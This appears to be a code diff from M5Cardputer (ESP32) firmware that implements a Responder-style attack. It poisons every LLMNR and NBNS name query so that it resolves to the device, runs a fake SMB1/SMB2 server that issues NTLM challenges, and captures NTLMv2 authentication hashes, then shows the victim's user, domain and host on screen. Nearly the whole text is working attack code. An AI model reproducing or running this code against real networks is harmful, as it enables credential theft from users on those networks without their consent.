+  // 4) Envoie
+  smbState.client.write(resp, total);
+  Serial.println("→ NTLMv2 Type 2 (SMB1) send");
+}
+
+void handleSMB1(uint8_t* pkt, uint32_t len) {
+  // Structure header SMBv1 (32 octets)
+  uint8_t  command   = pkt[4];            // offset 4
+
+  // ----------  NEGOTIATE (0x72)  ----------
+  if (command == 0x72) {
+    /* point de départ = tout de suite après le BCC (2 octets)           */
+    uint16_t bcc = pkt[33] | (pkt[34] << 8);      // ByteCount
+    const uint8_t* d = pkt + 35;                  // <-- 35, pas 36
+    const uint8_t* end = d + bcc;
+
+    bool smb2Asked = false;
+    while (d < end && *d == 0x02) {               // 0x02 = "dialect string"
+      const char* name = (const char*)(d + 1);
+      if (strncmp(name, "SMB 2", 5) == 0) {
+        smb2Asked = true;
+        break;
+      }
+      d += 2 + strlen(name);                    // 0x02 + chaîne + '\0'
+    }
+
+    if (smb2Asked) {
+      Serial.println("Client ask for SMB 2 → switch to SMB 2");
+      sendSMB2NegotiateFromSMB1();
+    } else {
+      Serial.println("Client stay in SMB 1");
+      sendSMB1NegotiateResponse(pkt);
+    }
+    return;
+  }
+  // ----------  SESSION SETUP ANDX (0x73) ----------
+  if (command == 0x73) {                  // SMB_COM_SESSION_SETUP_ANDX
+    uint16_t andxOffset = *(uint16_t*)(pkt + 45); // début des données NTLM
+    uint8_t* ntlm = pkt + andxOffset;
+
+    if (memcmp(ntlm, "NTLMSSP", 7) == 0 && len > andxOffset + 8) {
+      uint8_t type = ntlm[8];
+      if (type == 1) {                    // Type1 → envoyer challenge
+        Serial.println("NTLM Type 1 (SMB1) received");
+        sendSMB1Type2(pkt, ntlm);         // 2-b
+      } else if (type == 3) {             // Type3 = hash capturé
+        Serial.println("NTLM Type 3 (SMB1) received");
+        extractAndPrintHash(pkt, len, ntlm);
+        terminateSMB1();               // réponse « SUCCESS » puis close
+      }
+    }
+  }
+}
+
+void sendSMB2NegotiateFromSMB1() {
+  uint8_t resp[256] = {0};
+
+  /* ── 1.  NBSS ─────────────────────────────────────────── */
+  resp[0] = 0x00;                 // Session message, LEN plus bas
+
+  /* ── 2.  HEADER SMB‑2 (64 oct.) ───────────────────────── */
+  uint8_t* h = resp + 4;
+  h[0] = 0xFE;  h[1] = 'S';  h[2] = 'M';  h[3] = 'B';
+  h[4] = 0x40;  h[5] = 0x00;              // StructureSize = 64
+  h[6] = 0x00;  h[7] = 0x00;              // CreditCharge
+  h[8] = h[9] = h[10] = h[11] = 0x00;     // ChannelSequence / Reserved
+  h[12] = 0x00; h[13] = 0x00;             // Command = NEGOTIATE
+  h[14] = 0x01; h[15] = 0x00;             // CreditResponse = 1
+  *(uint32_t*)(h + 16) = 0x00000001;      // Flags = SERVER_TO_REDIR
+  *(uint32_t*)(h + 20) = 0x00000000;      // NextCommand = 0
+  *(uint64_t*)(h + 24) = 0;               // MessageId   = 0
+  *(uint32_t*)(h + 32) = 0x0000FEFF;      // ProcessId   (valeur Windows)
+  *(uint32_t*)(h + 36) = 0;               // TreeId = 0
+  *(uint64_t*)(h + 40) = 0;               // SessionId = 0
+  memset(h + 48, 0, 16);                  // Signature (pas de signing)
+
+  /* ── 3.  Corps NEGOTIATE RESPONSE (65 oct.) ───────────── */
+  uint8_t* p = h + 64;
+  p[0] = 0x41; p[1] = 0x00;               // StructureSize = 65
+  p[2] = 0x01; p[3] = 0x00;               // SecurityMode = signing‑enabled
+  p[4] = 0x02; p[5] = 0x02;               // DialectRevision = 0x0202 (SMB 2.002)
+  p[6] = p[7] = 0x00;                     // Reserved
+
+  /* Server GUID (16 oct.) – on fabrique quelque chose d’unique */
+  uint8_t serverGuid[16];
+  for (int i = 0; i < 16; i++) serverGuid[i] = esp_random() & 0xFF;
+  memcpy(p + 8, serverGuid, 16);
+
+
+  *(uint32_t*)(p + 24) = 0x00000000;      // Capabilities (0 suffisent)
+  *(uint32_t*)(p + 28) = 0x00010000;      // MaxTrans
+  *(uint32_t*)(p + 32) = 0x00010000;      // MaxRead
+  *(uint32_t*)(p + 36) = 0x00010000;      // MaxWrite
+  memset(p + 40, 0, 16);                  // SystemTime + StartTime
+  *(uint16_t*)(p + 56) = 0;               // SecBufOffset
+  *(uint16_t*)(p + 58) = 0;               // SecBufLength
+  /* (p+60..64  NégContext = 0 / Reserved) */
+
+  /* ── 4.  Longueur NBSS ────────────────────────────────── */
+  uint32_t total = 4 + 64 + 65;           // = 133
+  resp[1] = (total - 4) >> 16;
+  resp[2] = (total - 4) >> 8;
+  resp[3] = (total - 4);
+
+  smbState.client.write(resp, total);
+  Serial.println("→ Negotiate Response SMB‑v2 send (upgrade successfull)");
+}
+
+#include <cmath>
+#define PI 3.14159265f
+
+// --- CONFIGURATION RADAR ---
+const int RADAR_R        = 50;   // rayon du radar (px)
+const int RADAR_MARGIN   = 10;   // marge autour
+const int MAX_DETECTIONS = 10;   // nombre max de points simultanés
+const int DET_TTL        = 60 ;   // durée de vie initiale des points (frames)
+
+struct DetPoint {
+  int x, y;
+  int ttl;   // durée de vie restante en frames
+};
+DetPoint detections[MAX_DETECTIONS];
+int detCount = 0;
+
+// Variables globales du radar
+float currentAngle = 0.0f;
+int currentCx = 0, currentCy = 0, currentR = RADAR_R;
+
+void addDetectionPoint() {
+    static int callCount = 0;
+    callCount++;
+    if (callCount % 3 != 0) return;
+
+    float dist = random(currentR / 2, currentR);
+    int px = currentCx + cosf(currentAngle) * dist;
+    int py = currentCy + sinf(currentAngle) * dist;
+
+    DetPoint newP = { px, py, DET_TTL };
+    if (detCount < MAX_DETECTIONS) {
+        detections[detCount++] = newP;
+    } else {
+        // décalage vers la gauche pour faire de la place
+        for (int i = 1; i < detCount; i++) {
+            detections[i-1] = detections[i];
+        }
+        detections[detCount-1] = newP;
+    }
+}
+void showWaitingAnimation() {
+  static float angle = 0.0f;
+  auto& d = M5Cardputer.Display;
+
+  // texte d’état
+  d.setTextSize(1.5);
+  d.setTextColor(TFT_WHITE, TFT_BLACK);
+  d.setCursor(5, 5);
+  d.print("Waiting for LLMNR or NBNS");
+
+  // position et rayon du radar
+  int screenW = d.width();
+  int screenH = d.height();
+  int cx = screenW / 2;
+  int cy = RADAR_R + RADAR_MARGIN + 10;
+  int r  = RADAR_R;
+
+  currentCx = cx;
+  currentCy = cy;
+  currentR  = r;
+  currentAngle = angle;
+
+  // fond
+  d.fillCircle(cx, cy, r + 2, TFT_BLACK);
+
+  // cercles concentriques
+  d.drawCircle(cx, cy, r,         TFT_DARKGREY);
+  d.drawCircle(cx, cy, r * 2 / 3, TFT_DARKGREY);
+  d.drawCircle(cx, cy, r / 3,     TFT_DARKGREY);
+
+  // croix (traits horizontaux et verticaux)
+  d.drawLine(cx - r, cy, cx + r, cy, TFT_DARKGREY);
+  d.drawLine(cx, cy - r, cx, cy + r, TFT_DARKGREY);
+
+  // ligne de balayage
+  int x2 = cx + cosf(angle) * r;
+  int y2 = cy + sinf(angle) * r;
+  d.drawLine(cx, cy, x2, y2, TFT_GREEN);
+
+  // mise à jour de l’angle
+  angle += 0.1f;
+  if (angle >= 2 * PI) angle -= 2 * PI;
+
+  // dessin des points avec fade-out
+  for (int i = 0; i < detCount; i++) {
+    auto& p = detections[i];
+    float fade = float(p.ttl) / DET_TTL;
+    uint16_t col = d.color565(
+      uint8_t(173 * fade),
+      uint8_t(255 * fade),
+      uint8_t(47  * fade)
+    );
+    d.fillCircle(p.x, p.y, 3, col);
+    if (--p.ttl <= 0) {
+      for (int j = i; j < detCount - 1; j++)
+        detections[j] = detections[j + 1];
+      detCount--;
+      i--;
+    }
+  }
+
+  int yPos = screenH - 12;      // position verticale de la ligne
+  d.fillRect(0, yPos, screenW, 12, TFT_BLACK);
+
+  // --- Affichage “Asked” ---
+  d.setTextSize(1);
+  d.setTextColor(TFT_WHITE, TFT_BLACK);
+  d.setCursor(2, yPos);
+  d.print("Request: ");
+  d.print(lastQueryName);
+}
+
+void showActiveAnimation() {
+  static float angle = 0.0f;
+  auto& d = M5Cardputer.Display;
+
+  // petit radar en coin
+  int screenW      = d.width();
+  const int smallR = 15;
+  const int margin = 4;
+  int cx = screenW - smallR - margin;
+  int cy = smallR + margin;
+  int r  = smallR;
+
+  currentCx = cx;
+  currentCy = cy;
+  currentR  = r;
+  currentAngle = angle;
+
+  // fond et cercle fixe
+  d.fillCircle(cx, cy, r + 1, TFT_BLACK);
+  d.drawCircle(cx, cy, r,         TFT_DARKGREY);
+  d.drawCircle(cx, cy, r * 2 / 3, TFT_DARKGREY);
+  d.drawCircle(cx, cy, r / 3,     TFT_DARKGREY);
+
+  // croix (traits horizontaux et verticaux)
+  d.drawLine(cx - r, cy, cx + r, cy, TFT_DARKGREY);
+  d.drawLine(cx, cy - r, cx, cy + r, TFT_DARKGREY);
+
+  // balayage
+  int x2 = cx + cosf(angle) * r;
+  int y2 = cy + sinf(angle) * r;
+  d.drawLine(cx, cy, x2, y2, TFT_GREEN);
+
+  angle += 0.15f;
+  if (angle >= 2 * PI) angle -= 2 * PI;
+
+  // dessin des points avec fade-out
+  for (int i = 0; i < detCount; i++) {
+    auto& p = detections[i];
+    float fade = float(p.ttl) / DET_TTL;
+    uint16_t col = d.color565(
+      uint8_t(173 * fade),
+      uint8_t(255 * fade),
+      uint8_t(47  * fade)
+    );
+    d.fillCircle(p.x, p.y, 2, col);
+    if (--p.ttl <= 0) {
+      for (int j = i; j < detCount - 1; j++)
+        detections[j] = detections[j + 1];
+      detCount--;
+      i--;
+    }
+  }
+}
+
+
+void updateHashUI() {
+  auto& d = M5Cardputer.Display;
+  d.fillScreen(BLACK);
+
+  // 1) NTLM count
+  d.setTextSize(1.3);
+  d.setTextColor(WHITE, BLACK);
+  d.setCursor(5, 5);
+  d.print("NTLM: ");
+  d.setTextSize(2);
+  d.print(hashCount);
+
+  // 2) User
+  d.setTextSize(1.3);
+  d.setCursor(5, 30);
+  d.print("User: ");
+  d.setTextSize(2);
+  d.print(lastUser);
+
+  // 3) Domain
+  d.setTextSize(1.3);
+  d.setCursor(5, 55);
+  d.print("Domain: ");
+  d.setTextSize(2);
+  d.print(lastDomain);
+
+  // 4) Client (hostname)
+  d.setTextSize(1.3);
+  d.setCursor(5, 80);
+  d.print("Client: ");
+  d.setTextSize(2);
+  d.print(lastClient);
+
+  // 5) Query (NBNS/LLMNR + name)
+  d.setTextSize(1.3);
+  d.setCursor(5, 105);
+  d.print(lastQueryProtocol + ": ");
+  d.setTextSize(2);
+  d.print(lastQueryName);
+}
+
+
+
+
+unsigned long lastAnim = 0;
+
+
+void responder() {
+  M5.Lcd.fillScreen(BLACK);
+  M5Cardputer.Display.setTextColor(WHITE, BLACK);
+  hashCount = 0;
+  // Démarrer l'écoute NBNS (UDP 137)
+  if (!nbnsUDP.begin(NBNS_PORT)) {
+    Serial.println("Erreur: Impossible to listen on UDP 137");
+  }
+  // Démarrer l'écoute LLMNR (UDP 5355) en IPv4 uniquement
+  if (!llmnrUDP.beginMulticast(IPAddress(224, 0, 0, 252), LLMNR_PORT)) {
+    Serial.println("Erreur: échec abonnement multicast LLMNR");
+  }
+  // Démarrer le serveur SMB (TCP 445)
+  smbServer.begin();
+  smbState.active = false;
+
+  Serial.println("Responder ready - Waiting for NBNS/LLMNR request...");
+  while (!M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+  M5Cardputer.update();
+  unsigned long now = millis();
+  if (now - lastAnim > 250) {
+      // Choix de la fonction selon le count
+      if (hashCount == 0) {
+          showWaitingAnimation();
+      } else if (hashCount == 1) {
+          detCount = 0; 
+          showActiveAnimation();
+      } else {
+          showActiveAnimation();
+      }
+      lastAnim = now;
+  }
+  int packetSize = nbnsUDP.parsePacket();
+  if (packetSize > 0) {
+    uint8_t buf[100];
+    int len = nbnsUDP.read(buf, sizeof(buf));
+    if (len >= 50) { // taille minimale d'une requête NBNS standard ~50 octets
+      // Vérifier qu'il s'agit d'une requête NBNS de type nom (0x20)
+      // Flags (octets 2-3) : bit 15 = 0 pour question
+      uint16_t flags = (buf[2] << 8) | buf[3];
+      uint16_t qdCount = (buf[4] << 8) | buf[5];
+      uint16_t qType = (buf[len - 4] << 8) | buf[len - 3]; // Type sur les 2 octets avant les 2 derniers (class)
+      uint16_t qClass = (buf[len - 2] << 8) | buf[len - 1]; // Class sur les 2 derniers octets
+      if ((flags & 0x8000) == 0 && qdCount >= 1 && qType == 0x0020 && qClass == 0x0001) {
+        // Extraire le nom encodé sur 32 octets à partir de l'offset 13 (après length byte)
+        // Offset 12 = length of name (0x20), offset 13..44 = nom encodé
+        if (len >= 46 && buf[12] == 0x20) {
+          // Répondre à toute requête NBNS receivede sans vérifier le nom demandé
+          uint8_t resp[80];
+          // Copier Transaction ID
+          resp[0] = buf[0];
+          resp[1] = buf[1];
+          // Flags: réponse (bit15=1), AA=1, Rcode=0
+          resp[2] = 0x84;
+          resp[3] = 0x00;
+          // QDcount=0, ANcount=1, NScount=0, ARcount=0
+          resp[4] = 0x00; resp[5] = 0x00;
+          resp[6] = 0x00; resp[7] = 0x01;
+          resp[8] = 0x00; resp[9] = 0x00;
+          resp[10] = 0x00; resp[11] = 0x00;
+          // Name (copier les 34 octets du nom encodé + terminator de la requête)
+          memcpy(resp + 12, buf + 12, 34);
+          // Type & Class (2 octets chacun, même que la question)
+          resp[46] = 0x00; resp[47] = 0x20;  // Type NB
+          resp[48] = 0x00; resp[49] = 0x01;  // Class IN
+          // TTL (4 octets)
+          resp[50] = 0x00; resp[51] = 0x00; resp[52] = 0x00; resp[53] = 0x3C; // TTL = 60 secondes
+          // Data length (6 octets pour NB)
+          resp[54] = 0x00; resp[55] = 0x06;
+          // NB flags (unique = 0x0000)
+          resp[56] = 0x00; resp[57] = 0x00;
+          // Adresse IP (4 octets)
+          IPAddress ip = getIPAddress();
+          resp[58] = ip[0];
+          resp[59] = ip[1];
+          resp[60] = ip[2];
+          resp[61] = ip[3];
+          char decoded[16];
+          // Envoyer la réponse NBNS à l'émetteur
+          nbnsUDP.beginPacket(nbnsUDP.remoteIP(), nbnsUDP.remotePort());
+          nbnsUDP.write(resp, 62);
+          nbnsUDP.endPacket();
+          addDetectionPoint();
+          Serial.println("Answer NBNS send.");
+        }
+      }
+    }
+  }
+  /**************** Traitement des requêtes LLMNR ****************/
+  packetSize = llmnrUDP.parsePacket();
+  if (packetSize > 0) {
+    uint8_t buf[300];
+    int len = llmnrUDP.read(buf, sizeof(buf));
+    Serial.printf("[LLMNR] paquet %d octets received\n", len);
+
+    /* 1) Contrôles de base ------------------------------------------------ */
+    if (len < 12) continue;                             // trop court
+    uint16_t flags   = (buf[2] << 8) | buf[3];
+    uint16_t qdCount = (buf[4] << 8) | buf[5];
+    uint16_t anCount = (buf[6] << 8) | buf[7];
+    if ( (flags & 0x8000) || qdCount == 0 || anCount != 0) return;  // pas une question “pure”
+
+    /* 2) Lecture du premier label (on ne gère qu’un seul label simple) ---- */
+    uint8_t nameLen = buf[12];
+    if (nameLen == 0 || nameLen >= 64 || (13 + nameLen + 4) > len) continue;
+    if (buf[13 + nameLen] != 0x00) continue;            // on veut exactement 1 label + terminator
+
+    const uint8_t* qtypePtr  = buf + 13 + nameLen + 1;    // +1 -> terminator 0x00
+    uint16_t qType  = (qtypePtr[0] << 8) | qtypePtr[1];
+    uint16_t qClass = (qtypePtr[2] << 8) | qtypePtr[3];
+
+    /* 3) Debug : affichage du nom et du type --------------------------------*/
+    char qName[65];  memcpy(qName, buf + 13, nameLen);  qName[nameLen] = '\0';
+    Serial.printf("[LLMNR] Query « %s », type 0x%04X\n", qName, qType);
+    lastQueryName     = String(qName);
+    lastQueryProtocol = "LLMNR";
+
+    /* 4) On répond aux types A (0x0001) et AAAA (0x001C) ------------------- */
+    bool isA    = (qType == 0x0001);
+    bool isAAAA = (qType == 0x001C);
+    if (!isA && !isAAAA) continue;                       // on ignore les autres
+
+    if (qClass != 0x0001) continue;                      // IN seulement
+
+    /* 5) Construction de la réponse --------------------------------------- */
+    uint16_t questionLen = 1 + nameLen + 1 + 2 + 2;    // label + len0 + type + class
+    uint8_t resp[350];
+
+    /* -- Header -- */
+    resp[0] = buf[0]; resp[1] = buf[1];                // Transaction ID
+    resp[2] = 0x84;   resp[3] = 0x00;                  // QR=1 | AA=1
+    resp[4] = 0x00; resp[5] = 0x01;                    // QDcount = 1
+    resp[6] = 0x00; resp[7] = 0x01;                    // ANcount = 1
+    resp[8] = resp[9]  = 0x00;                         // NScount
+    resp[10] = resp[11] = 0x00;                        // ARcount
+
+    /* -- Question copiée telle quelle -- */
+    memcpy(resp + 12, buf + 12, questionLen);
+
+    /* -- Answer -- */
+    uint16_t ansOff = 12 + questionLen;
+    resp[ansOff + 0] = 0xC0;          // pointeur 0xC00C vers le nom en question
+    resp[ansOff + 1] = 0x0C;
+    resp[ansOff + 2] = qtypePtr[0];   // même TYPE que la question
+    resp[ansOff + 3] = qtypePtr[1];
+    resp[ansOff + 4] = 0x00; resp[ansOff + 5] = 0x01;   // CLASS = IN
+    resp[ansOff + 6] = 0x00; resp[ansOff + 7] = 0x00;   // TTL = 30 s
+    resp[ansOff + 8] = 0x00; resp[ansOff + 9] = 0x1E;
+
+    if (isA) {
+      /* ---- Réponse IPv4 (4 octets) ---- */
+      resp[ansOff + 10] = 0x00; resp[ansOff + 11] = 0x04; // RDLENGTH
+      IPAddress ip = getIPAddress();
+      resp[ansOff + 12] = ip[0]; resp[ansOff + 13] = ip[1];
+      resp[ansOff + 14] = ip[2]; resp[ansOff + 15] = ip[3];
+      llmnrUDP.beginPacket(llmnrUDP.remoteIP(), llmnrUDP.remotePort());
+      llmnrUDP.write(resp, ansOff + 16);
+      llmnrUDP.endPacket();
+      addDetectionPoint();
+    } else {
+      /* ---- Réponse IPv6 (on renvoie ::FFFF:IPv4) ---- */
+      resp[ansOff + 10] = 0x00; resp[ansOff + 11] = 0x10; // RDLENGTH = 16
+      /* ::ffff:a.b.c.d  →  0…0 ffff  + IPv4 */
+      memset(resp + ansOff + 12, 0, 10);
+      resp[ansOff + 22] = 0xFF; resp[ansOff + 23] = 0xFF;
+      IPAddress ip = getIPAddress();
+      resp[ansOff + 24] = ip[0]; resp[ansOff + 25] = ip[1];
+      resp[ansOff + 26] = ip[2]; resp[ansOff + 27] = ip[3];
+      llmnrUDP.beginPacket(llmnrUDP.remoteIP(), llmnrUDP.remotePort());
+      llmnrUDP.write(resp, ansOff + 28);
+      llmnrUDP.endPacket();
+      addDetectionPoint();
+    }
+
+    Serial.println("[LLMNR] → answer send");
+  }
+
+  // Accepter nouvelle connexion SMB si non déjà en cours
+  if (!smbState.active) {
+    WiFiClient newClient = smbServer.available();
+    if (newClient) {
+      smbState.client = newClient;
+      smbState.active = true;
+      smbState.sessionId = 0;
+      Serial.println("Connexion SMB received, starting the SMB2 negociation...");
+    }
+  }
+
+  // Gérer la connexion SMB active (état machine NTLM)
+  if (smbState.active && smbState.client.connected()) {
+    // Définir un petit timeout pour lecture (évitons blocage)
+    smbState.client.setTimeout(100);
+    // Lire l'entête NetBIOS (4 octets) si disponible
+    if (smbState.client.available() >= 4) {
+      uint8_t nbss[4];
+      if (smbState.client.read(nbss, 4) == 4) {
+        uint32_t smbLength = ((uint32_t)nbss[1] << 16) | ((uint32_t)nbss[2] << 8) | nbss[3];
+        if (smbLength == 0) {
+          // Keep-alive ou paquet vide, on ignore
+        } else {
+          // Lire le paquet SMB complet
+          uint8_t *packet = (uint8_t*)malloc(smbLength);
+          if (!packet) {
+            Serial.println("Mémoire insuffisante pour SMB");
+            smbState.client.stop();
+            smbState.active = false;
+          } else {
+            if (smbState.client.read(packet, smbLength) == smbLength) {
+              // Vérifier protocole SMB2 (header commence par 0xFE 'S' 'M' 'B')
+              if (smbLength >= 64 && packet[0] == 0xFE && packet[1] == 'S' && packet[2] == 'M' && packet[3] == 'B') {
+                uint16_t command = packet[12] | (packet[13] << 8);
+                // Négociation SMB2
+                if (command == 0x0000) { // SMB2 NEGOTIATE
+                  Serial.println("Requête SMB2 Negotiate receivede.");
+                  // Construire et envoyer la réponse SMB2 Negotiate (sélection SMB2.1)
+                  // Copier l'en-tête du client pour le renvoyer modifié
+                  uint8_t resp[128];
+                  // NetBIOS header
+                  resp[0] = 0x00;
+                  // On remplira la longueur plus tard
+                  // SMB2 header (64 octets)
+                  memcpy(resp + 4, packet, 64);
+                  // Marquer comme réponse
+                  resp[4 + 4] = 0x40; resp[4 + 5] = 0x00; // StructureSize (non utilisé pour header)
+                  // Flags: bit0 (ServerToRedir) = 1
+                  resp[4 + 16] = packet[16] | 0x01;
+                  // Status = 0 (succès)
+                  *(uint32_t*)(resp + 4 + 8) = 0x00000000;
+                  // Crédit accordé (conserver celui demandé ou au moins 1)
+                  resp[4 + 14] = packet[14];
+                  resp[4 + 15] = packet[15];
+                  if (resp[4 + 14] == 0 && resp[4 + 15] == 0) {
+                    resp[4 + 14] = 0x01;
+                    resp[4 + 15] = 0x00;
+                  }
+                  // SessionId = 0 (pas encore de session établie)
+                  memset(resp + 4 + 40, 0, 8);
+                  // Command reste 0x0000, MessageId idem (copié)
+                  // TreeId peut rester comme dans la requête (pas utilisé)
+                  // Préparer le corps Negotiate Response
+                  // StructureSize = 65 (0x41)
+                  resp[4 + 64] = 0x41;
+                  resp[4 + 65] = 0x00;
+                  // SecurityMode: 0x01 (signing enabled, not required)
+                  resp[4 + 66] = 0x01;
+                  resp[4 + 67] = 0x00;
+                  // Dialect = 0x0210 (Little-endian: 0x10 0x02)
+                  resp[4 + 68] = 0x10;
+                  resp[4 + 69] = 0x02;
+                  // Reserved
+                  resp[4 + 70] = 0x00;
+                  resp[4 + 71] = 0x00;
+                  // Server GUID (16 octets) - on peut utiliser l'adresse MAC pour uniq.
+                  uint8_t mac[6];
+                  WiFi.macAddress(mac);
+                  uint8_t serverGuid[16] = {
+                    /* MAC1, MAC2, MAC3, MAC4, MAC5, MAC6, */
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+                  };
+                  WiFi.macAddress(serverGuid);
+                  memcpy(resp + 4 + 72, serverGuid, 16);
+                  // Copier MAC dans GUID (les 6 premiers octets)
+                  memcpy(resp + 4 + 72, mac, 6);
+                  // Capabilities = 0 (pas de DFS, pas de multi-crédit)
+                  *(uint32_t*)(resp + 4 + 88) = 0x00000000;
+                  // MaxTransaction, MaxRead, MaxWrite = 65536 (0x10000)
+                  *(uint32_t*)(resp + 4 + 92) = 0x00010000;
+                  *(uint32_t*)(resp + 4 + 96) = 0x00010000;
+                  *(uint32_t*)(resp + 4 + 100) = 0x00010000;
+                  // Current System Time (8 bytes) et Boot Time (8 bytes) à 0 (ou on pourrait mettre heure réelle)
+                  memset(resp + 4 + 104, 0, 16);
+                  // SecurityBufferOffset et Length = 0 (pas de token de sécurité dans Negotiate)
+                  resp[4 + 120] = 0x00; resp[4 + 121] = 0x00;
+                  resp[4 + 122] = 0x00; resp[4 + 123] = 0x00;
+                  // Calculer longueur SMB2 message (64 + 65 = 129 octets)
+                  uint32_t smb2Len = 64 + 65;
+                  resp[1] = (smb2Len >> 16) & 0xFF;
+                  resp[2] = (smb2Len >> 8) & 0xFF;
+                  resp[3] = smb2Len & 0xFF;
+                  // Envoyer
+                  smbState.client.write(resp, 4 + smb2Len);
+                  Serial.println("SMB2 Negotiate answer send (Dialect SMB2.1).");
+                }
+                // Session Setup Request
+                else if (command == 0x0001) {
+                  // Extraire la charge de sécurité (NTLMSSP) de la requête
+                  // Chercher "NTLMSSP"
+                  int ntlmIndex = -1;
+                  for (uint32_t i = 0; i < smbLength - 7; ++i) {
+                    if (memcmp(packet + i, "NTLMSSP", 7) == 0) {
+                      ntlmIndex = i;
+                      break;
+                    }
+                  }
+                  if (ntlmIndex >= 0 && ntlmIndex + 8 < smbLength) {
+                    uint8_t ntlmMsgType = packet[ntlmIndex + 8];
+                    if (ntlmMsgType == 1) {
+                      // Type 1: NTLMSSP Negotiate
+                      Serial.println("NTLMSSP Type 1 received, sending Type 2 (challenge)...");
+
+                      // 1) Génère un challenge aléatoire de 8 octets
+                      for (int i = 0; i < 8; ++i) {
+                        smbState.challenge[i] = (uint8_t)(esp_random() & 0xFF);
+                      }
+
+                      // 2) Construit dynamiquement le blob NTLM Type 2
+                      buildNTLMType2Msg(smbState.challenge, ntlmType2Buffer, &ntlmType2Len);
+
+                      // 3) Conserve un SessionId unique
+                      smbState.sessionId = ((uint64_t)esp_random() << 32) | esp_random();
+                      if (smbState.sessionId == 0) smbState.sessionId = 1;
+
+                      // 4) Prépare le SMB2 Session Setup Response + blob
+                      uint8_t resp[600] = {0};
+
+                      // — NetBIOS header (longueur calculée plus bas)
+                      resp[0] = 0x00;
+
+                      // — Copie l’en-tête SMB2 receivede
+                      memcpy(resp + 4, packet, 64);
+
+                      // — Marque en réponse
+                      resp[4 + 16] = packet[16] | 0x01;              // ServerToRedir
+                      *(uint32_t*)(resp + 4 + 8)  = 0xC0000016;      // STATUS_MORE_PROCESSING_REQUIRED
+
+                      // — Crédits et IDs
+                      resp[4 + 14] = packet[14];
+                      resp[4 + 15] = packet[15];
+                      *(uint64_t*)(resp + 4 + 40) = smbState.sessionId;
+
+                      // — Corps Session Setup
+                      resp[4 + 64] = 0x09;  // StructureSize
+                      resp[4 + 65] = 0x00;
+                      resp[4 + 66] = 0x00;  // SessionFlags
+                      resp[4 + 67] = 0x00;
+
+                      // — Offset et longueur du blob
+                      *(uint16_t*)(resp + 4 + 68) = 0x48;            // SecurityBufferOffset = 72
+                      *(uint16_t*)(resp + 4 + 70) = ntlmType2Len;    // SecurityBufferLength
+
+                      // — Padding
+                      resp[4 + 72] = resp[4 + 73] = 0x00;
+
+                      // 5) Copie le blob généré
+                      memcpy(resp + 4 + 72, ntlmType2Buffer, ntlmType2Len);
+
+                      // 6) Calcule et écrit la longueur NetBIOS
+                      uint32_t smb2Len = 64 + 9 + ntlmType2Len;
+                      resp[1] = (smb2Len >> 16) & 0xFF;
+                      resp[2] = (smb2Len >>  8) & 0xFF;
+                      resp[3] =  smb2Len        & 0xFF;
+
+                      // 7) Envoie la réponse
+                      smbState.client.write(resp, 4 + smb2Len);
+                      Serial.println("Type 2 dynamique send. Waiting for Type 3...");
+                    }
+                    else if (ntlmMsgType == 3) {
+                      // Type 3 : NTLMSSP Authenticate (SMB v2)
+                      Serial.println("NTLMSSP Type 3 received, checking for hash...");
+                      extractAndPrintHash(packet,            // pointeur début paquet
+                                          smbLength,         // longueur totale SMB
+                                          packet + ntlmIndex // pointeur début NTLMSSP
+                                         );
+
+                      // --- réponse finale SMB2 « success » puis fermeture ----------
+                      uint8_t resp[100];
+                      resp[0] = 0x00;                        // NBSS
+                      memcpy(resp + 4, packet, 64);          // header copié
+                      resp[4 + 16] = packet[16] | 0x01;      // ServerToRedir
+                      *(uint32_t*)(resp + 4 + 8) = 0x00000000;       // STATUS_SUCCESS
+                      *(uint64_t*)(resp + 4 + 40) = smbState.sessionId;
+                      resp[4 + 64] = 0x09;  resp[4 + 65] = 0x00;     // StructureSize
+                      resp[4 + 66] = 0x00; resp[4 + 67] = 0x00;     // SessionFlags
+                      resp[4 + 68] = 0x48; resp[4 + 69] = 0x00;     // SecBufOffset
+                      resp[4 + 70] = 0x00; resp[4 + 71] = 0x00;     // SecBufLen
+                      resp[4 + 72] = resp[4 + 73] = 0x00;           // padding
+
+                      uint32_t smb2Len = 64 + 9;
+                      resp[1] = (smb2Len >> 16) & 0xFF;
+                      resp[2] = (smb2Len >>  8) & 0xFF;
+                      resp[3] =  smb2Len        & 0xFF;
+
+                      smbState.client.write(resp, 4 + smb2Len);
+                      smbState.client.stop();
+                      smbState.active = false;
+                      Serial.println("Session SMB finnished.");
+                    }
+                  }
+                }
+                // Tree Connect ou autre commande après authent (optionnel, ici on ferme la connexion donc probablement sans objet)
+                else if (command == 0x0003) {
+                  // Tree Connect Request (après authent réussie)
+                  Serial.println("Receive Tree Connect (ressource acces). End of session.");
+                  smbState.client.stop();
+                  smbState.active = false;
+                }
+              } else if (packet[0] == 0xFF && packet[1] == 'S' && packet[2] == 'M' && packet[3] == 'B') {
+                Serial.println("Paquet SMBv1 received.");
+                handleSMB1(packet, smbLength);
+                continue;
+              }
+            }
+            free(packet);
+          }
+        }
+      }
+    }
+  }
+
+  if (smbState.active && !smbState.client.connected()) {
+    smbState.client.stop();
+    smbState.active = false;
+    Serial.println("Client SMB disconnected.");
+  }
+}
+  detCount = 0;
+
+  waitAndReturnToMenu("Return to menu");
 }
